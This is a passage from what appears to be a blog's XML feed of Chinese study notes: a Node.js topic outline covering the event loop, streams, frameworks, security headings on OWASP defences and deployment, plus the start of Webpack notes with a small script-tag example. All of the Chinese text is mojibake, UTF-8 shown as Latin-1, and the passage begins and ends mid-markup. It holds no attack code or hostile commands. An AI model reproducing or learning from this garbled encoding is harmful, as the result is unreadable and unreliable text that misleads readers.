æ¡†æ¶é›†æˆè®¾è®¡é—®é¢˜</h3><h3 id="6-4-4-æ€§èƒ½ä¼˜åŒ–æŒ‡æ ‡åˆ†æ"><a href="#6-4-4-æ€§èƒ½ä¼˜åŒ–æŒ‡æ ‡åˆ†æ" class="headerlink" title="6.4.4 æ€§èƒ½ä¼˜åŒ–æŒ‡æ ‡åˆ†æ"></a>6.4.4 æ€§èƒ½ä¼˜åŒ–æŒ‡æ ‡åˆ†æ</h3>]]></content>
    
    
    <categories>
      
      <category>TypeScript</category>
      
    </categories>
    
    
    <tags>
      
      <tag>TypeScript</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NodeJS ä¸“é¢˜çŸ¥è¯†å­¦ä¹ </title>
    <link href="/2025/07/05/NodeJS%20Study%20Notes/"/>
    <url>/2025/07/05/NodeJS%20Study%20Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="1-æ ¸å¿ƒåŸºç¡€æ¨¡å—"><a href="#1-æ ¸å¿ƒåŸºç¡€æ¨¡å—" class="headerlink" title="1. æ ¸å¿ƒåŸºç¡€æ¨¡å—"></a>1. æ ¸å¿ƒåŸºç¡€æ¨¡å—</h1><h2 id="1-1-Node-js-æ¶æ„ä¸è¿è¡ŒåŸç†ï¼ˆV8-libuv-äº‹ä»¶å¾ªç¯ï¼‰"><a href="#1-1-Node-js-æ¶æ„ä¸è¿è¡ŒåŸç†ï¼ˆV8-libuv-äº‹ä»¶å¾ªç¯ï¼‰" class="headerlink" title="1.1 Node.js æ¶æ„ä¸è¿è¡ŒåŸç†ï¼ˆV8&#x2F;libuv&#x2F;äº‹ä»¶å¾ªç¯ï¼‰"></a>1.1 Node.js æ¶æ„ä¸è¿è¡ŒåŸç†ï¼ˆV8&#x2F;libuv&#x2F;äº‹ä»¶å¾ªç¯ï¼‰</h2><h2 id="1-2-CommonJS-ä¸-ESM-æ¨¡å—ç³»ç»Ÿæ·±å…¥"><a href="#1-2-CommonJS-ä¸-ESM-æ¨¡å—ç³»ç»Ÿæ·±å…¥" class="headerlink" title="1.2 CommonJS ä¸ ESM æ¨¡å—ç³»ç»Ÿæ·±å…¥"></a>1.2 CommonJS ä¸ ESM æ¨¡å—ç³»ç»Ÿæ·±å…¥</h2><h2 id="1-3-å…¨å±€å¯¹è±¡ä¸æ ¸å¿ƒAPIï¼ˆprocess-Buffer-dirnameç­‰ï¼‰"><a href="#1-3-å…¨å±€å¯¹è±¡ä¸æ ¸å¿ƒAPIï¼ˆprocess-Buffer-dirnameç­‰ï¼‰" class="headerlink" title="1.3 å…¨å±€å¯¹è±¡ä¸æ ¸å¿ƒAPIï¼ˆprocess, Buffer, __dirnameç­‰ï¼‰"></a>1.3 å…¨å±€å¯¹è±¡ä¸æ ¸å¿ƒAPIï¼ˆprocess, Buffer, __dirnameç­‰ï¼‰</h2><h2 id="1-4-å¼‚æ­¥ç¼–ç¨‹èŒƒå¼"><a href="#1-4-å¼‚æ­¥ç¼–ç¨‹èŒƒå¼" class="headerlink" title="1.4 å¼‚æ­¥ç¼–ç¨‹èŒƒå¼"></a>1.4 å¼‚æ­¥ç¼–ç¨‹èŒƒå¼</h2><h3 id="1-4-1-Callback-åœ°ç‹±è§£å†³æ–¹æ¡ˆ"><a href="#1-4-1-Callback-åœ°ç‹±è§£å†³æ–¹æ¡ˆ" class="headerlink" title="1.4.1 Callback åœ°ç‹±è§£å†³æ–¹æ¡ˆ"></a>1.4.1 Callback åœ°ç‹±è§£å†³æ–¹æ¡ˆ</h3><h3 id="1-4-2-Promise-é«˜çº§ç”¨æ³•ï¼ˆé“¾å¼-å¹¶å‘æ§åˆ¶ï¼‰"><a href="#1-4-2-Promise-é«˜çº§ç”¨æ³•ï¼ˆé“¾å¼-å¹¶å‘æ§åˆ¶ï¼‰" class="headerlink" title="1.4.2 Promise é«˜çº§ç”¨æ³•ï¼ˆé“¾å¼&#x2F;å¹¶å‘æ§åˆ¶ï¼‰"></a>1.4.2 Promise é«˜çº§ç”¨æ³•ï¼ˆé“¾å¼&#x2F;å¹¶å‘æ§åˆ¶ï¼‰</h3><h3 id="1-4-3-Async-Await-åŸç†ä¸é”™è¯¯å¤„ç†"><a href="#1-4-3-Async-Await-åŸç†ä¸é”™è¯¯å¤„ç†" class="headerlink" title="1.4.3 Async&#x2F;Await åŸç†ä¸é”™è¯¯å¤„ç†"></a>1.4.3 Async&#x2F;Await åŸç†ä¸é”™è¯¯å¤„ç†</h3><h1 id="2-å…³é”®å­ç³»ç»Ÿæ·±åº¦æŒæ¡"><a href="#2-å…³é”®å­ç³»ç»Ÿæ·±åº¦æŒæ¡" class="headerlink" title="2. å…³é”®å­ç³»ç»Ÿæ·±åº¦æŒæ¡"></a>2. å…³é”®å­ç³»ç»Ÿæ·±åº¦æŒæ¡</h1><h2 id="2-1-äº‹ä»¶å¾ªç¯ï¼ˆEvent-Loopï¼‰"><a href="#2-1-äº‹ä»¶å¾ªç¯ï¼ˆEvent-Loopï¼‰" class="headerlink" title="2.1 äº‹ä»¶å¾ªç¯ï¼ˆEvent Loopï¼‰"></a>2.1 äº‹ä»¶å¾ªç¯ï¼ˆEvent Loopï¼‰</h2><h3 id="2-1-1-é˜¶æ®µè¯¦è§£ï¼ˆtimers-poll-checkç­‰ï¼‰"><a href="#2-1-1-é˜¶æ®µè¯¦è§£ï¼ˆtimers-poll-checkç­‰ï¼‰" class="headerlink" title="2.1.1 é˜¶æ®µè¯¦è§£ï¼ˆtimers&#x2F;poll&#x2F;checkç­‰ï¼‰"></a>2.1.1 é˜¶æ®µè¯¦è§£ï¼ˆtimers&#x2F;poll&#x2F;checkç­‰ï¼‰</h3><h3 id="2-1-2-nextTick-ä¸-setImmediate-æœºåˆ¶"><a href="#2-1-2-nextTick-ä¸-setImmediate-æœºåˆ¶" class="headerlink" title="2.1.2 nextTick ä¸ setImmediate æœºåˆ¶"></a>2.1.2 nextTick ä¸ setImmediate æœºåˆ¶</h3><h3 id="2-1-3-æµè§ˆå™¨ä¸Nodeäº‹ä»¶å¾ªç¯å·®å¼‚"><a href="#2-1-3-æµè§ˆå™¨ä¸Nodeäº‹ä»¶å¾ªç¯å·®å¼‚" class="headerlink" title="2.1.3 æµè§ˆå™¨ä¸Nodeäº‹ä»¶å¾ªç¯å·®å¼‚"></a>2.1.3 æµè§ˆå™¨ä¸Nodeäº‹ä»¶å¾ªç¯å·®å¼‚</h3><h2 id="2-2-æµï¼ˆStreamï¼‰ä¸ç¼“å†²åŒºï¼ˆBufferï¼‰"><a href="#2-2-æµï¼ˆStreamï¼‰ä¸ç¼“å†²åŒºï¼ˆBufferï¼‰" class="headerlink" title="2.2 æµï¼ˆStreamï¼‰ä¸ç¼“å†²åŒºï¼ˆBufferï¼‰"></a>2.2 æµï¼ˆStreamï¼‰ä¸ç¼“å†²åŒºï¼ˆBufferï¼‰</h2><h3 id="2-2-1-å››ç§æµç±»å‹ä¸åº”ç”¨åœºæ™¯"><a href="#2-2-1-å››ç§æµç±»å‹ä¸åº”ç”¨åœºæ™¯" class="headerlink" title="2.2.1 å››ç§æµç±»å‹ä¸åº”ç”¨åœºæ™¯"></a>2.2.1 å››ç§æµç±»å‹ä¸åº”ç”¨åœºæ™¯</h3><h3 id="2-2-2-èƒŒå‹ï¼ˆBackpressureï¼‰å¤„ç†"><a href="#2-2-2-èƒŒå‹ï¼ˆBackpressureï¼‰å¤„ç†" class="headerlink" title="2.2.2 èƒŒå‹ï¼ˆBackpressureï¼‰å¤„ç†"></a>2.2.2 èƒŒå‹ï¼ˆBackpressureï¼‰å¤„ç†</h3><h3 id="2-2-3-äºŒè¿›åˆ¶æ•°æ®å¤„ç†ä¼˜åŒ–"><a href="#2-2-3-äºŒè¿›åˆ¶æ•°æ®å¤„ç†ä¼˜åŒ–" class="headerlink" title="2.2.3 äºŒè¿›åˆ¶æ•°æ®å¤„ç†ä¼˜åŒ–"></a>2.2.3 äºŒè¿›åˆ¶æ•°æ®å¤„ç†ä¼˜åŒ–</h3><h2 id="2-3-ç½‘ç»œç¼–ç¨‹"><a href="#2-3-ç½‘ç»œç¼–ç¨‹" class="headerlink" title="2.3 ç½‘ç»œç¼–ç¨‹"></a>2.3 ç½‘ç»œç¼–ç¨‹</h2><h3 id="2-3-1-TCP-UDP-æœåŠ¡å™¨æ„å»º"><a href="#2-3-1-TCP-UDP-æœåŠ¡å™¨æ„å»º" class="headerlink" title="2.3.1 TCP&#x2F;UDP æœåŠ¡å™¨æ„å»º"></a>2.3.1 TCP&#x2F;UDP æœåŠ¡å™¨æ„å»º</h3><h3 id="2-3-2-HTTP-1-1-2-3-åè®®å®ç°"><a href="#2-3-2-HTTP-1-1-2-3-åè®®å®ç°" class="headerlink" title="2.3.2 HTTP 1.1&#x2F;2&#x2F;3 åè®®å®ç°"></a>2.3.2 HTTP 1.1&#x2F;2&#x2F;3 åè®®å®ç°</h3><h3 id="2-3-3-Websocket-å®æ—¶é€šä¿¡"><a href="#2-3-3-Websocket-å®æ—¶é€šä¿¡" class="headerlink" title="2.3.3 Websocket å®æ—¶é€šä¿¡"></a>2.3.3 Websocket å®æ—¶é€šä¿¡</h3><h1 id="3-æ¡†æ¶ä¸å·¥ç¨‹åŒ–"><a href="#3-æ¡†æ¶ä¸å·¥ç¨‹åŒ–" class="headerlink" title="3. æ¡†æ¶ä¸å·¥ç¨‹åŒ–"></a>3. æ¡†æ¶ä¸å·¥ç¨‹åŒ–</h1><h2 id="3-1-Express-Koa-æºç åˆ†æ"><a href="#3-1-Express-Koa-æºç åˆ†æ" class="headerlink" title="3.1 Express&#x2F;Koa æºç åˆ†æ"></a>3.1 Express&#x2F;Koa æºç åˆ†æ</h2><h3 id="3-1-1-ä¸­é—´ä»¶æœºåˆ¶ï¼ˆæ´‹è‘±æ¨¡å‹ï¼‰"><a href="#3-1-1-ä¸­é—´ä»¶æœºåˆ¶ï¼ˆæ´‹è‘±æ¨¡å‹ï¼‰" class="headerlink" title="3.1.1 ä¸­é—´ä»¶æœºåˆ¶ï¼ˆæ´‹è‘±æ¨¡å‹ï¼‰"></a>3.1.1 ä¸­é—´ä»¶æœºåˆ¶ï¼ˆæ´‹è‘±æ¨¡å‹ï¼‰</h3><h3 id="3-1-2-è·¯ç”±ç³»ç»ŸåŸç†"><a href="#3-1-2-è·¯ç”±ç³»ç»ŸåŸç†" class="headerlink" title="3.1.2 è·¯ç”±ç³»ç»ŸåŸç†"></a>3.1.2 è·¯ç”±ç³»ç»ŸåŸç†</h3><h3 id="3-1-3-æ€§èƒ½ä¼˜åŒ–æ–¹æ¡ˆ"><a href="#3-1-3-æ€§èƒ½ä¼˜åŒ–æ–¹æ¡ˆ" class="headerlink" title="3.1.3 æ€§èƒ½ä¼˜åŒ–æ–¹æ¡ˆ"></a>3.1.3 æ€§èƒ½ä¼˜åŒ–æ–¹æ¡ˆ</h3><h2 id="3-2-ä¼ä¸šçº§æ¡†æ¶å®è·µ"><a href="#3-2-ä¼ä¸šçº§æ¡†æ¶å®è·µ" class="headerlink" title="3.2 ä¼ä¸šçº§æ¡†æ¶å®è·µ"></a>3.2 ä¼ä¸šçº§æ¡†æ¶å®è·µ</h2><h3 id="3-2-1-NestJS-æ¶æ„è®¾è®¡ï¼ˆä¾èµ–æ³¨å…¥-å¾®æœåŠ¡ï¼‰"><a href="#3-2-1-NestJS-æ¶æ„è®¾è®¡ï¼ˆä¾èµ–æ³¨å…¥-å¾®æœåŠ¡ï¼‰" class="headerlink" title="3.2.1 NestJS æ¶æ„è®¾è®¡ï¼ˆä¾èµ–æ³¨å…¥&#x2F;å¾®æœåŠ¡ï¼‰"></a>3.2.1 NestJS æ¶æ„è®¾è®¡ï¼ˆä¾èµ–æ³¨å…¥&#x2F;å¾®æœåŠ¡ï¼‰</h3><h3 id="3-2-2-Fastify-é«˜æ€§èƒ½åŸç†"><a href="#3-2-2-Fastify-é«˜æ€§èƒ½åŸç†" class="headerlink" title="3.2.2 Fastify é«˜æ€§èƒ½åŸç†"></a>3.2.2 Fastify é«˜æ€§èƒ½åŸç†</h3><h2 id="3-3-å·¥ç¨‹åŒ–ä½“ç³»"><a href="#3-3-å·¥ç¨‹åŒ–ä½“ç³»" class="headerlink" title="3.3 å·¥ç¨‹åŒ–ä½“ç³»"></a>3.3 å·¥ç¨‹åŒ–ä½“ç³»</h2><h3 id="3-3-1-è„šæ‰‹æ¶å¼€å‘ï¼ˆYeomanåŸç†ï¼‰"><a href="#3-3-1-è„šæ‰‹æ¶å¼€å‘ï¼ˆYeomanåŸç†ï¼‰" class="headerlink" title="3.3.1 è„šæ‰‹æ¶å¼€å‘ï¼ˆYeomanåŸç†ï¼‰"></a>3.3.1 è„šæ‰‹æ¶å¼€å‘ï¼ˆYeomanåŸç†ï¼‰</h3><h3 id="3-3-2-è‡ªå®šä¹‰Loader-Pluginå¼€å‘"><a href="#3-3-2-è‡ªå®šä¹‰Loader-Pluginå¼€å‘" class="headerlink" title="3.3.2 è‡ªå®šä¹‰Loader&#x2F;Pluginå¼€å‘"></a>3.3.2 è‡ªå®šä¹‰Loader&#x2F;Pluginå¼€å‘</h3><h3 id="3-3-3-Monorepo-ç®¡ç†æ–¹æ¡ˆ"><a href="#3-3-3-Monorepo-ç®¡ç†æ–¹æ¡ˆ" class="headerlink" title="3.3.3 Monorepo ç®¡ç†æ–¹æ¡ˆ"></a>3.3.3 Monorepo ç®¡ç†æ–¹æ¡ˆ</h3><h1 id="4-æ€§èƒ½ä¸å®‰å…¨"><a href="#4-æ€§èƒ½ä¸å®‰å…¨" class="headerlink" title="4. æ€§èƒ½ä¸å®‰å…¨"></a>4. æ€§èƒ½ä¸å®‰å…¨</h1><h2 id="4-1-æ€§èƒ½è°ƒä¼˜å®æˆ˜"><a href="#4-1-æ€§èƒ½è°ƒä¼˜å®æˆ˜" class="headerlink" title="4.1 æ€§èƒ½è°ƒä¼˜å®æˆ˜"></a>4.1 æ€§èƒ½è°ƒä¼˜å®æˆ˜</h2><h3 id="4-1-1-å†…å­˜æ³„æ¼æ’æŸ¥ï¼ˆheapdump-chrome-devtoolsï¼‰"><a href="#4-1-1-å†…å­˜æ³„æ¼æ’æŸ¥ï¼ˆheapdump-chrome-devtoolsï¼‰" class="headerlink" title="4.1.1 å†…å­˜æ³„æ¼æ’æŸ¥ï¼ˆheapdump&#x2F;chrome devtoolsï¼‰"></a>4.1.1 å†…å­˜æ³„æ¼æ’æŸ¥ï¼ˆheapdump&#x2F;chrome devtoolsï¼‰</h3><h3 id="4-1-2-CPU-æ€§èƒ½åˆ†æï¼ˆperf-0xï¼‰"><a href="#4-1-2-CPU-æ€§èƒ½åˆ†æï¼ˆperf-0xï¼‰" class="headerlink" title="4.1.2 CPU æ€§èƒ½åˆ†æï¼ˆperf&#x2F;0xï¼‰"></a>4.1.2 CPU æ€§èƒ½åˆ†æï¼ˆperf&#x2F;0xï¼‰</h3><h3 id="4-1-3-é›†ç¾¤æ¨¡å¼ï¼ˆCluster-PM2åŸç†ï¼‰"><a href="#4-1-3-é›†ç¾¤æ¨¡å¼ï¼ˆCluster-PM2åŸç†ï¼‰" class="headerlink" title="4.1.3 é›†ç¾¤æ¨¡å¼ï¼ˆCluster&#x2F;PM2åŸç†ï¼‰"></a>4.1.3 é›†ç¾¤æ¨¡å¼ï¼ˆCluster&#x2F;PM2åŸç†ï¼‰</h3><h2 id="4-2-å®‰å…¨é˜²æŠ¤"><a href="#4-2-å®‰å…¨é˜²æŠ¤" class="headerlink" title="4.2 å®‰å…¨é˜²æŠ¤"></a>4.2 å®‰å…¨é˜²æŠ¤</h2><h3 id="4-2-1-OWASP-æ”»å‡»é˜²èŒƒï¼ˆXSS-CSRF-SQLæ³¨å…¥ï¼‰"><a href="#4-2-1-OWASP-æ”»å‡»é˜²èŒƒï¼ˆXSS-CSRF-SQLæ³¨å…¥ï¼‰" class="headerlink" title="4.2.1 OWASP æ”»å‡»é˜²èŒƒï¼ˆXSS&#x2F;CSRF&#x2F;SQLæ³¨å…¥ï¼‰"></a>4.2.1 OWASP æ”»å‡»é˜²èŒƒï¼ˆXSS&#x2F;CSRF&#x2F;SQLæ³¨å…¥ï¼‰</h3><h3 id="4-2-2-åŠ å¯†æ–¹æ¡ˆï¼ˆJWT-éå¯¹ç§°åŠ å¯†ï¼‰"><a href="#4-2-2-åŠ å¯†æ–¹æ¡ˆï¼ˆJWT-éå¯¹ç§°åŠ å¯†ï¼‰" class="headerlink" title="4.2.2 åŠ å¯†æ–¹æ¡ˆï¼ˆJWT&#x2F;éå¯¹ç§°åŠ å¯†ï¼‰"></a>4.2.2 åŠ å¯†æ–¹æ¡ˆï¼ˆJWT&#x2F;éå¯¹ç§°åŠ å¯†ï¼‰</h3><h3 id="4-2-3-Helmet-å®‰å…¨å¤´é…ç½®"><a href="#4-2-3-Helmet-å®‰å…¨å¤´é…ç½®" class="headerlink" title="4.2.3 Helmet å®‰å…¨å¤´é…ç½®"></a>4.2.3 Helmet å®‰å…¨å¤´é…ç½®</h3><h1 id="5-æœåŠ¡ç«¯ä¸“é¡¹èƒ½åŠ›"><a href="#5-æœåŠ¡ç«¯ä¸“é¡¹èƒ½åŠ›" class="headerlink" title="5. æœåŠ¡ç«¯ä¸“é¡¹èƒ½åŠ›"></a>5. æœåŠ¡ç«¯ä¸“é¡¹èƒ½åŠ›</h1><h2 id="5-1-æ•°æ®åº“é›†æˆ"><a href="#5-1-æ•°æ®åº“é›†æˆ" class="headerlink" title="5.1 æ•°æ®åº“é›†æˆ"></a>5.1 æ•°æ®åº“é›†æˆ</h2><h3 id="5-1-1-MongoDBï¼ˆMongooseé«˜çº§ç‰¹æ€§ï¼‰"><a href="#5-1-1-MongoDBï¼ˆMongooseé«˜çº§ç‰¹æ€§ï¼‰" class="headerlink" title="5.1.1 MongoDBï¼ˆMongooseé«˜çº§ç‰¹æ€§ï¼‰"></a>5.1.1 MongoDBï¼ˆMongooseé«˜çº§ç‰¹æ€§ï¼‰</h3><h3 id="5-1-2-SQL-æ•°æ®åº“ï¼ˆSequelize-TypeORMï¼‰"><a href="#5-1-2-SQL-æ•°æ®åº“ï¼ˆSequelize-TypeORMï¼‰" class="headerlink" title="5.1.2 SQL æ•°æ®åº“ï¼ˆSequelize&#x2F;TypeORMï¼‰"></a>5.1.2 SQL æ•°æ®åº“ï¼ˆSequelize&#x2F;TypeORMï¼‰</h3><h3 id="5-1-3-Redis-ç¼“å­˜ä¸æ¶ˆæ¯é˜Ÿåˆ—"><a href="#5-1-3-Redis-ç¼“å­˜ä¸æ¶ˆæ¯é˜Ÿåˆ—" class="headerlink" title="5.1.3 Redis ç¼“å­˜ä¸æ¶ˆæ¯é˜Ÿåˆ—"></a>5.1.3 Redis ç¼“å­˜ä¸æ¶ˆæ¯é˜Ÿåˆ—</h3><h2 id="5-2-æµ‹è¯•ç­–ç•¥"><a href="#5-2-æµ‹è¯•ç­–ç•¥" class="headerlink" title="5.2 æµ‹è¯•ç­–ç•¥"></a>5.2 æµ‹è¯•ç­–ç•¥</h2><h3 id="5-2-1-å•å…ƒæµ‹è¯•ï¼ˆJest-Mochaï¼‰"><a href="#5-2-1-å•å…ƒæµ‹è¯•ï¼ˆJest-Mochaï¼‰" class="headerlink" title="5.2.1 å•å…ƒæµ‹è¯•ï¼ˆJest&#x2F;Mochaï¼‰"></a>5.2.1 å•å…ƒæµ‹è¯•ï¼ˆJest&#x2F;Mochaï¼‰</h3><h3 id="5-2-2-é›†æˆæµ‹è¯•ï¼ˆSupertestï¼‰"><a href="#5-2-2-é›†æˆæµ‹è¯•ï¼ˆSupertestï¼‰" class="headerlink" title="5.2.2 é›†æˆæµ‹è¯•ï¼ˆSupertestï¼‰"></a>5.2.2 é›†æˆæµ‹è¯•ï¼ˆSupertestï¼‰</h3><h3 id="5-2-3-å‹åŠ›æµ‹è¯•ï¼ˆArtilleryï¼‰"><a href="#5-2-3-å‹åŠ›æµ‹è¯•ï¼ˆArtilleryï¼‰" class="headerlink" title="5.2.3 å‹åŠ›æµ‹è¯•ï¼ˆArtilleryï¼‰"></a>5.2.3 å‹åŠ›æµ‹è¯•ï¼ˆArtilleryï¼‰</h3><h2 id="5-3-éƒ¨ç½²ä¸è¿ç»´"><a href="#5-3-éƒ¨ç½²ä¸è¿ç»´" class="headerlink" title="5.3 éƒ¨ç½²ä¸è¿ç»´"></a>5.3 éƒ¨ç½²ä¸è¿ç»´</h2><h3 id="5-3-1-Docker-å®¹å™¨åŒ–éƒ¨ç½²"><a href="#5-3-1-Docker-å®¹å™¨åŒ–éƒ¨ç½²" class="headerlink" title="5.3.1 Docker å®¹å™¨åŒ–éƒ¨ç½²"></a>5.3.1 Docker å®¹å™¨åŒ–éƒ¨ç½²</h3><h3 id="5-3-2-æ—¥å¿—ç³»ç»Ÿï¼ˆWinston-ELKï¼‰"><a href="#5-3-2-æ—¥å¿—ç³»ç»Ÿï¼ˆWinston-ELKï¼‰" class="headerlink" title="5.3.2 æ—¥å¿—ç³»ç»Ÿï¼ˆWinston&#x2F;ELKï¼‰"></a>5.3.2 æ—¥å¿—ç³»ç»Ÿï¼ˆWinston&#x2F;ELKï¼‰</h3><h3 id="5-3-3-ç›‘æ§æŠ¥è­¦ï¼ˆPrometheus-Grafanaï¼‰"><a href="#5-3-3-ç›‘æ§æŠ¥è­¦ï¼ˆPrometheus-Grafanaï¼‰" class="headerlink" title="5.3.3 ç›‘æ§æŠ¥è­¦ï¼ˆPrometheus&#x2F;Grafanaï¼‰"></a>5.3.3 ç›‘æ§æŠ¥è­¦ï¼ˆPrometheus&#x2F;Grafanaï¼‰</h3><h1 id="6-å‰æ²¿ç”Ÿæ€"><a href="#6-å‰æ²¿ç”Ÿæ€" class="headerlink" title="6. å‰æ²¿ç”Ÿæ€"></a>6. å‰æ²¿ç”Ÿæ€</h1><h2 id="6-1-Serverless-æ¡†æ¶ï¼ˆMidway-jsï¼‰"><a href="#6-1-Serverless-æ¡†æ¶ï¼ˆMidway-jsï¼‰" class="headerlink" title="6.1 Serverless æ¡†æ¶ï¼ˆMidway.jsï¼‰"></a>6.1 Serverless æ¡†æ¶ï¼ˆMidway.jsï¼‰</h2><h2 id="6-2-è¾¹ç¼˜è®¡ç®—ï¼ˆEdge-Runtimeï¼‰"><a href="#6-2-è¾¹ç¼˜è®¡ç®—ï¼ˆEdge-Runtimeï¼‰" class="headerlink" title="6.2 è¾¹ç¼˜è®¡ç®—ï¼ˆEdge Runtimeï¼‰"></a>6.2 è¾¹ç¼˜è®¡ç®—ï¼ˆEdge Runtimeï¼‰</h2><h2 id="6-3-TypeScript-æ·±åº¦é›†æˆ"><a href="#6-3-TypeScript-æ·±åº¦é›†æˆ" class="headerlink" title="6.3 TypeScript æ·±åº¦é›†æˆ"></a>6.3 TypeScript æ·±åº¦é›†æˆ</h2><h2 id="6-4-WebAssembly-æ”¯æŒ"><a href="#6-4-WebAssembly-æ”¯æŒ" class="headerlink" title="6.4 WebAssembly æ”¯æŒ"></a>6.4 WebAssembly æ”¯æŒ</h2><h1 id="7-æ¶æ„è®¾è®¡èƒ½åŠ›"><a href="#7-æ¶æ„è®¾è®¡èƒ½åŠ›" class="headerlink" title="7. æ¶æ„è®¾è®¡èƒ½åŠ›"></a>7. æ¶æ„è®¾è®¡èƒ½åŠ›</h1><h2 id="7-1-å¾®æœåŠ¡æ¶æ„ï¼ˆgRPC-æ¶ˆæ¯é˜Ÿåˆ—ï¼‰"><a href="#7-1-å¾®æœåŠ¡æ¶æ„ï¼ˆgRPC-æ¶ˆæ¯é˜Ÿåˆ—ï¼‰" class="headerlink" title="7.1 å¾®æœåŠ¡æ¶æ„ï¼ˆgRPC&#x2F;æ¶ˆæ¯é˜Ÿåˆ—ï¼‰"></a>7.1 å¾®æœåŠ¡æ¶æ„ï¼ˆgRPC&#x2F;æ¶ˆæ¯é˜Ÿåˆ—ï¼‰</h2><h2 id="7-2-BFF-å±‚è®¾è®¡ä¸å®ç°"><a href="#7-2-BFF-å±‚è®¾è®¡ä¸å®ç°" class="headerlink" title="7.2 BFF å±‚è®¾è®¡ä¸å®ç°"></a>7.2 BFF å±‚è®¾è®¡ä¸å®ç°</h2><h2 id="7-3-é«˜å¹¶å‘è§£å†³æ–¹æ¡ˆ"><a href="#7-3-é«˜å¹¶å‘è§£å†³æ–¹æ¡ˆ" class="headerlink" title="7.3 é«˜å¹¶å‘è§£å†³æ–¹æ¡ˆ"></a>7.3 é«˜å¹¶å‘è§£å†³æ–¹æ¡ˆ</h2><h3 id="7-3-1-è´Ÿè½½å‡è¡¡ç­–ç•¥"><a href="#7-3-1-è´Ÿè½½å‡è¡¡ç­–ç•¥" class="headerlink" title="7.3.1 è´Ÿè½½å‡è¡¡ç­–ç•¥"></a>7.3.1 è´Ÿè½½å‡è¡¡ç­–ç•¥</h3><h3 id="7-3-2-é™æµç†”æ–­ï¼ˆSentinelï¼‰"><a href="#7-3-2-é™æµç†”æ–­ï¼ˆSentinelï¼‰" class="headerlink" title="7.3.2 é™æµç†”æ–­ï¼ˆSentinelï¼‰"></a>7.3.2 é™æµç†”æ–­ï¼ˆSentinelï¼‰</h3><h3 id="7-3-3-åˆ†å¸ƒå¼äº‹åŠ¡"><a href="#7-3-3-åˆ†å¸ƒå¼äº‹åŠ¡" class="headerlink" title="7.3.3 åˆ†å¸ƒå¼äº‹åŠ¡"></a>7.3.3 åˆ†å¸ƒå¼äº‹åŠ¡</h3><h2 id="7-4-ç¨³å®šæ€§ä¿éšœ"><a href="#7-4-ç¨³å®šæ€§ä¿éšœ" class="headerlink" title="7.4 ç¨³å®šæ€§ä¿éšœ"></a>7.4 ç¨³å®šæ€§ä¿éšœ</h2><h3 id="7-4-1-å…¨é“¾è·¯è¿½è¸ªï¼ˆOpenTelemetryï¼‰"><a href="#7-4-1-å…¨é“¾è·¯è¿½è¸ªï¼ˆOpenTelemetryï¼‰" class="headerlink" title="7.4.1 å…¨é“¾è·¯è¿½è¸ªï¼ˆOpenTelemetryï¼‰"></a>7.4.1 å…¨é“¾è·¯è¿½è¸ªï¼ˆOpenTelemetryï¼‰</h3><h3 id="7-4-2-å®¹ç¾é™çº§æ–¹æ¡ˆ"><a href="#7-4-2-å®¹ç¾é™çº§æ–¹æ¡ˆ" class="headerlink" title="7.4.2 å®¹ç¾é™çº§æ–¹æ¡ˆ"></a>7.4.2 å®¹ç¾é™çº§æ–¹æ¡ˆ</h3>]]></content>
    
    
    <categories>
      
      <category>NodeJS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>NodeJS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Webpack ä¸“é¢˜çŸ¥è¯†å­¦ä¹ </title>
    <link href="/2025/07/03/Webpack%20Notes/"/>
    <url>/2025/07/03/Webpack%20Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="ä¸€ã€æ ¸å¿ƒæ¦‚å¿µä¸åŸºç¡€"><a href="#ä¸€ã€æ ¸å¿ƒæ¦‚å¿µä¸åŸºç¡€" class="headerlink" title="ä¸€ã€æ ¸å¿ƒæ¦‚å¿µä¸åŸºç¡€"></a>ä¸€ã€æ ¸å¿ƒæ¦‚å¿µä¸åŸºç¡€</h1><h2 id="1-1-Webpack-å®šä½ä¸æ ¸å¿ƒä»·å€¼"><a href="#1-1-Webpack-å®šä½ä¸æ ¸å¿ƒä»·å€¼" class="headerlink" title="1.1 Webpack å®šä½ä¸æ ¸å¿ƒä»·å€¼"></a>1.1 Webpack å®šä½ä¸æ ¸å¿ƒä»·å€¼</h2><h3 id="1-1-1-æ¨¡å—åŒ–æ‰“åŒ…çš„æœ¬è´¨éœ€æ±‚"><a href="#1-1-1-æ¨¡å—åŒ–æ‰“åŒ…çš„æœ¬è´¨éœ€æ±‚" class="headerlink" title="1.1.1 æ¨¡å—åŒ–æ‰“åŒ…çš„æœ¬è´¨éœ€æ±‚"></a>1.1.1 æ¨¡å—åŒ–æ‰“åŒ…çš„æœ¬è´¨éœ€æ±‚</h3><p><strong>å‰ç«¯å¼€å‘çš„æ ¸å¿ƒæ¼”å˜</strong></p><p>åŸå§‹é˜¶æ®µï¼šå…¨å±€å˜é‡æ±¡æŸ“</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;!-- ä¼ ç»Ÿå¼€å‘æ–¹å¼ --&gt;<br>&lt;script src=&quot;jquery.js&quot;&gt;&lt;/script&gt;<br>&lt;script src=&quot;plugin1.js&quot;&gt;&lt;/script&gt; &lt;!-- å¯èƒ½è¦†ç›–å…¨å±€å˜é‡ --&gt;<br>&lt;script src=&quot;plugin2.js&quot;&gt;&lt;/script&gt; &lt;!-- ä¾èµ–é¡ºåºå¿…é¡»æ­£ç¡® --&gt;<br></code></pre></td></tr></table></figure><p>æ¨¡å—åŒ–é©å‘½ï¼š</p><ul><li>CommonJSï¼ˆNode.jsï¼‰ï¼šconst module &#x3D; require(â€˜.&#x2F;moduleâ€™)</li><li>ES Modulesï¼ˆç°ä»£æµè§ˆå™¨ï¼‰ï¼šimport module from â€˜.&#x2F;module.jsâ€™</li></ul><span id="more"></span><p><strong>æ¨¡å—åŒ–æ‰“åŒ…è¦è§£å†³çš„å››å¤§æ ¸å¿ƒé—®é¢˜</strong></p><table><thead><tr><th align="left">é—®é¢˜ç±»å‹</th><th align="left">å…·ä½“è¡¨ç°</th><th align="left">è§£å†³æ–¹æ¡ˆ</th></tr></thead><tbody><tr><td align="left">ä¾èµ–ç®¡ç†</td><td align="left">è„šæœ¬åŠ è½½é¡ºåºæ··ä¹±<br>å¾ªç¯ä¾èµ–é£é™©</td><td 